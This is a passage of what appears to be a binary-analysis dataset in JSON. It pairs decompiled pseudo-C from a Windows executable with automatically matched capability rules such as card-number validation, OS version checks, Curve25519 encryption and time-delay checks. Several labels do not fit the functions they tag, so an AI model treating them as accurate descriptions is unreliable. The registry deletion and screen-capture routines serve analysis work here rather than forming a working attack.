        "decompiled_code": "\nvoid __fastcall fcn.00403ec4(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    uint8_t *in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    \n    puVar6 = in_EAX;\n    if (in_EAX == NULL) {\ncode_r0x00403f3a:\n        puVar6 = puVar6 + 1;\n    }\n    else {\n        uVar2 = 0;\n        do {\n            puVar5 = puVar6;\n            uVar3 = *puVar5;\n            puVar6 = puVar5 + 1;\n        } while (uVar3 == 0x20);\n        bVar1 = false;\n        if (uVar3 == 0x2d) {\n            bVar1 = true;\ncode_r0x00403f4a:\n            uVar3 = *puVar6;\n            puVar6 = puVar5 + 2;\n        }\n        else if (uVar3 == 0x2b) goto code_r0x00403f4a;\n        if (((uVar3 == 0x24) || (uVar3 == 0x78)) || (uVar3 == 0x58)) {\ncode_r0x00403f4f:\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n            if (uVar3 != 0) {\n                do {\n                    if (0x60 < uVar3) {\n                        uVar3 = uVar3 - 0x20;\n                    }\n                    uVar4 = uVar3 - 0x30;\n                    if (9 < uVar4) {\n                        if (5 < uVar3 + 0xbf) goto code_r0x00403f43;\n                        uVar4 = uVar3 - 0x37;\n                    }\n                    if (0xfffffff < uVar2) goto code_r0x00403f43;\n                    uVar2 = uVar2 * 0x10 + uVar4;\n                    uVar3 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                } while (uVar3 != 0);\ncode_r0x00403f8c:\n                iVar7 = 0;\n                goto code_r0x00403f8f;\n            }\n            goto code_r0x00403f3a;\n        }\n        if (uVar3 != 0x30) {\n            if (uVar3 != 0) goto code_r0x00403f16;\n            goto code_r0x00403f43;\n        }\n        uVar3 = *puVar6;\n        puVar6 = puVar6 + 1;\n        if ((uVar3 == 0x78) || (uVar3 == 0x58)) goto code_r0x00403f4f;\n        while (uVar3 != 0) {\ncode_r0x00403f16:\n            if ((9 < uVar3 - 0x30) || (0xccccccc < uVar2)) goto code_r0x00403f43;\n            uVar2 = uVar2 * 10 + (uVar3 - 0x30);\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n        }\n        if (bVar1) {\n            if ((-1 < uVar2) || (0 < uVar2)) goto code_r0x00403f8c;\n        }\n        else if (-1 < uVar2) goto code_r0x00403f8c;\n    }\ncode_r0x00403f43:\n    iVar7 = puVar6 - in_EAX;\ncode_r0x00403f8f:\n    *param_2 = iVar7;\n    return;\n}\n",
        "token_count": 876
    },
    "0040c980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040c980(char *arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint16_t *in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_8h = '\\0';\n    fcn.0040c95c();\n    iVar3 = *in_EDX;\n    uVar1 = 0;\n    while( true ) {\n        iVar2 = fcn.0040580c();\n        if (((iVar2 < iVar3) || (9 < *(in_EAX + -1 + iVar3) - 0x30U)) || (999 < uVar1)) break;\n        uVar1 = uVar1 * 10 + (*(in_EAX + -1 + iVar3) - 0x30);\n        iVar3 = iVar3 + 1;\n    }\n    iVar2 = *in_EDX;\n    if (iVar2 < iVar3) {\n        *arg_8h = iVar3 - *in_EDX;\n        *in_EDX = iVar3;\n        *in_ECX = uVar1;\n    }\n    return iVar2 < iVar3;\n}\n",
        "token_count": 283
    },
    "0041d08c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nuint32_t fcn.0041d08c(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.0041eb6c();\n    return uVar1 & 0xffffff00 | uVar1 == '\\t';\n}\n",
        "token_count": 57
    },
    "0042b734": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nint32_t * fcn.0042b734(void)\n\n{\n    uint arg_ch;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x42b74e;\n    var_8h = fcn.00429388();\n    uStack48 = 0x42b813;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    (**(*var_8h + 0x40))();\n    (**(*var_8h + 0x34))();\n    fcn.0042995c();\n    fcn.00425080();\n    fcn.00424f64();\n    arg_ch = (**(*var_8h + 0x20))();\n    arg_8h = &fcn.0042b734::var_18h;\n    (**(*var_8h + 0x2c))();\n    fcn.00418464(arg_8h, arg_ch);\n    fcn.00425308();\n    uVar4 = 0;\n    do {\n        uVar3 = 0;\n        do {\n            uVar1 = uVar4 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            uVar2 = uVar3 & 0x80000001;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == uVar2) {\n                fcn.00425678(var_4h);\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 != 9);\n        uVar4 = uVar4 + 1;\n    } while (uVar4 != 9);\n    fcn.00429618();\n    *in_FS_OFFSET = arg_8h;\n    return var_8h;\n}\n",
        "token_count": 537
    },
    "0042c844": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c844(int32_t arg_8h, int16_t *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_104h;\n    uint var_4h;\n    \n    if (0x40 < *(arg_10h + 1)) {\n        fcn.0040dbc0();\n        arg_ch = fcn.00404ec4();\n    }\n    if (*arg_ch == 9) {\n        var_4h = *(arg_ch + 4);\n    }\n    else if (*arg_ch == 0x4009) {\n        var_4h = **(arg_ch + 4);\n    }\n    else {\n        fcn.0042c82c();\n    }\n    fcn.0042c74c(&var_104h);\n    if (arg_8h != 0) {\n        fcn.00411644();\n    }\n    fcn.0042c3dc(arg_8h, arg_14h);\n    return;\n}\n",
        "token_count": 226
    },
    "0046c3b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid fcn.0046c3b4(void)\n\n{\n    int32_t iVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    \n    if (*(in_EAX + 0x16b8) < 0xe) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = 2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n    }\n    uVar2 = *0x494c98;\n    uVar3 = str._a__a__a__a[0];\n    if (0x10 - uVar3 < *(in_EAX + 0x16b8)) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x494c98 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = (uVar3 - 0x10) + *(in_EAX + 0x16b8);\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x494c98 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar3;\n    }\n    fcn.0046ce80();\n    iVar1 = *(in_EAX + 0x16b8);\n    if ((*(in_EAX + 0x16b0) + 0xb) - iVar1 < 9) {\n        if (iVar1 < 0xe) {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n        }\n        else {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (iVar1 & 0x1f);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n            *(in_EAX + 0x16b4) = 2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n        }\n        uVar2 = *0x494c98;\n        uVar3 = str._a__a__a__a[0];\n        if (0x10 - uVar3 < *(in_EAX + 0x16b8)) {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x494c98 << (*(in_EAX + 0x16b8) & 0x1f);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n            *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = (uVar3 - 0x10) + *(in_EAX + 0x16b8);\n        }\n        else {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x494c98 << (*(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar3;\n        }\n        fcn.0046ce80();\n    }\n    *(in_EAX + 0x16b0) = 7;\n    return;\n}\n",
        "token_count": 1675
    },
    "00485714": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid fcn.00485714(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar5 = 0;\n    do {\n        sub.user32.dll_SetRectEmpty();\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 9);\n    uVar1 = sub.user32.dll_GetDC(0);\n    *(in_EAX + 0x100) = uVar1;\n    for (iVar5 = *(in_EAX + 0x68); iVar5 < *(in_EAX + 100); iVar5 = iVar5 + 0x13) {\n        fcn.0042995c();\n        fcn.0042537c();\n        fcn.0042995c(0, 0, *(in_EAX + 0x60), 1, *(in_EAX + 0x100), 0, iVar5, 0xcc0020);\n        fcn.004256c0();\n        sub.gdi32.dll_BitBlt();\n        fcn.0042995c();\n        fcn.004255b4();\n        piVar2 = fcn.00429acc();\n        piVar3 = fcn.00429acc();\n        iVar4 = 0;\n        while (iVar4 < *(in_EAX + 0x60)) {\n            if (*piVar2 == *piVar3) {\n                piVar2 = piVar2 + 1;\n                piVar3 = piVar3 + 1;\n                iVar4 = iVar4 + *(in_EAX + 0x6c);\n            }\n            else {\n                fcn.0048a8b0();\n                fcn.0048a8b0();\n                fcn.0048a8b8();\n                fcn.0048a8b8();\n                fcn.00485c64();\n                piVar2 = piVar2 + 0x20 / *(in_EAX + 0x6c);\n                piVar3 = piVar3 + 0x20 / *(in_EAX + 0x6c);\n                iVar4 = iVar4 + 0x20;\n            }\n        }\n    }\n    *(in_EAX + 0x68) = (*(in_EAX + 0x68) + 3) % 0x13;\n    fcn.00485878();\n    sub.user32.dll_ReleaseDC(0, *(in_EAX + 0x100));\n    return;\n}\n",
        "token_count": 564
    },
    "0041d99c": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nunkbyte10 fcn.0041d99c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    unkbyte10 Stack16;\n    \n    cVar1 = fcn.0041eb6c();\n    if (cVar1 == '\\x05') {\n        fcn.0041d004();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        Stack16 = fcn.0041d9d4();\n    }\n    return Stack16;\n}\n",
        "token_count": 125
    },
    "004518e8": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004518e8(uint *param_1, uint *param_2)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    \n    if (*(in_EAX + 0x5b) == '\\x05') {\n        uVar4 = CONCAT31(in_EAX >> 8, 1);\n    }\n    else {\n        uVar2 = *param_2;\n        uVar3 = *param_1;\n        uVar4 = (**(*in_EAX + 0x34))();\n        uVar1 = *(in_EAX + 0x5b);\n        if ((uVar1 == 0) || (uVar1 - 3 < 2)) {\n            *param_2 = uVar2;\n        }\n        param_2 = uVar1 - 3;\n        if (uVar1 < 3) {\n            *param_1 = uVar3;\n            param_2 = param_1;\n        }\n    }\n    return CONCAT44(param_2, uVar4);\n}\n",
        "token_count": 248
    },
    "0046e078": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e078(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x46e08c;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack20 = 0x46e094;\n    fcn.004059cc();\n    uStack24 = 0x46e1ea;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    uVar1 = fcn.00409ee4();\n    // switch table (6 cases) at 0x46e0ba\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.0046e078::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.0046e078::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.0046e078::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.0046e078::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.0046e078::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.0046e078::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000006, uVar1);\n    }\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405554(0x46e1f1);\n    return;\n}\n",
        "token_count": 687
    },
    "0046e1f8": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e1f8(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint hKey;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x46e20f;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack24 = 0x46e217;\n    fcn.004059cc();\n    puStack24 = 0x46e21f;\n    fcn.004059cc();\n    uStack28 = 0x46e354;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    uVar1 = fcn.00409ee4();\n    // switch table (6 cases) at 0x46e245\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e1f8::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e1f8::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e1f8::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e1f8::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e1f8::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e1f8::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000006, uVar1);\n    }\n    uVar1 = fcn.004059dc();\n    sub.advapi32.dll_RegDeleteValueA(hKey, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405554(0x46e35b);\n    return;\n}\n",
        "token_count": 693
    },
    "0046e360": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e360(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x46e374;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack20 = 0x46e37c;\n    fcn.004059cc();\n    uStack24 = 0x46e4ad;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    uVar1 = fcn.00409ee4();\n    // switch table (6 cases) at 0x46e3a2\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e360::var_ch);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e360::var_ch);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e360::var_ch);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e360::var_ch);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e360::var_ch);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e360::var_ch);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000006, uVar1);\n    }\n    sub.advapi32.dll_RegDeleteKeyA(var_ch, 0x46e4b8);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = var_ch;\n    fcn.00405554(0x46e4b4);\n    return;\n}\n",
        "token_count": 650
    },
    "00404448": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404448(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint *puStack20;\n    uint var_ch;\n    uint32_t var_8h;\n    uint hKey;\n    \n    var_8h = *0x492024;\n    puStack20 = &fcn.00404448::hKey;\n    uStack24 = 1;\n    uStack28 = 0;\n    uStack32 = 0x4044e0;\n    uStack36 = 0x80000002;\n    puStack40 = 0x40446f;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 == 0) {\n        uStack44 = 0x4044b9;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        var_ch = 4;\n        uVar2 = hKey;\n        puStack40 = &stack0xfffffffc;\n        sub.advapi32.dll_RegQueryValueExA(hKey, 0x4044fc, 0, 0, &fcn.00404448::var_8h, &fcn.00404448::var_ch);\n        *in_FS_OFFSET = uVar2;\n        sub.advapi32.dll_RegCloseKey(hKey, 0x4044c0);\n        return;\n    }\n    *0x492024 = *0x492024 & 0xffc0 | var_8h & 0x3f;\n    return;\n}\n",
        "token_count": 396
    },
    "0045eaf0": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045eaf0(uint32_t param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x10);\n    *(in_EAX + 0x10) = *(in_EAX + 0x10) + param_1;\n    if (*(in_EAX + 0x10) <= uVar1 && uVar1 != *(in_EAX + 0x10)) {\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    }\n    uVar1 = 0x40 - (uVar1 & 0x3f);\n    if (param_1 < uVar1) {\n        fcn.004030fc();\n    }\n    else {\n        fcn.004030fc();\n        fcn.0045ec14();\n        for (param_1 = param_1 - uVar1; 0x3f < param_1; param_1 = param_1 - 0x40) {\n            fcn.004030fc();\n            fcn.0045ec14();\n        }\n        fcn.004030fc();\n    }\n    return;\n}\n",
        "token_count": 274
    },
    "0045eb84": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.0045eb84(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x10) & 0x3f;\n    *(in_EAX + 0x18 + uVar1) = 0x80;\n    if (0x37 - uVar1 < 0) {\n        fcn.00403af4();\n        fcn.0045ec14();\n    }\n    fcn.00403af4();\n    *(in_EAX + 0x50) = *(in_EAX + 0x10) * 8;\n    *(in_EAX + 0x54) = *(in_EAX + 0x14) * 8 | *(in_EAX + 0x10) >> 0x1d;\n    fcn.0045ec14();\n    fcn.004030fc();\n    fcn.00403af4();\n    return;\n}\n",
        "token_count": 215
    },
    "0040dd04": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489",
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.0040dd04(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack16;\n    uchar uStack12;\n    \n    iVar1 = fcn.004030dc();\n    for (iVar2 = 0; (iVar2 < 7 && (iVar1 != *(iVar2 * 8 + 0x492938))); iVar2 = iVar2 + 1) {\n    }\n    if (iVar2 < 7) {\n        iVar2 = fcn.0040db04();\n    }\n    else {\n        uStack12 = 0;\n        iStack16 = iVar1;\n        iVar2 = fcn.0040dbfc(0, &iStack16);\n    }\n    *(iVar2 + 0xc) = iVar1;\n    return;\n}\n",
        "token_count": 178
    },
    "00453cb0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00453cb0(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar in_CL;\n    int32_t in_EDX;\n    uint var_5h;\n    \n    uVar1 = 0;\n    // switch table (7 cases) at 0x453cd6\n    switch(in_CL) {\n    case 1:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n        break;\n    case 2:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar4 + uVar1 <= iVar2 + iVar3;\n        break;\n    case 3:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n        break;\n    case 4:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar4 + uVar1 <= iVar2 + iVar3;\n        break;\n    case 6:\n        uVar1 = (**(**(arg_8h + -4) + 0xa8))();\n    }\n    return uVar1;\n}\n",
        "token_count": 555
    },
    "004241dc": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.004241dc(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (in_EAX < 0) {\n        sub.user32.dll_GetSysColor(in_EAX & 0xff);\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "0046814c": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046814c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    iVar1 = *(in_EAX + 0x14);\n    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    *(*(in_EAX + 8) + iVar1) = param_2 >> 8;\n    iVar1 = *(in_EAX + 0x14);\n    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    *(*(in_EAX + 8) + iVar1) = param_2;\n    return;\n}\n",
        "token_count": 163
    },
    "0046c2f8": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
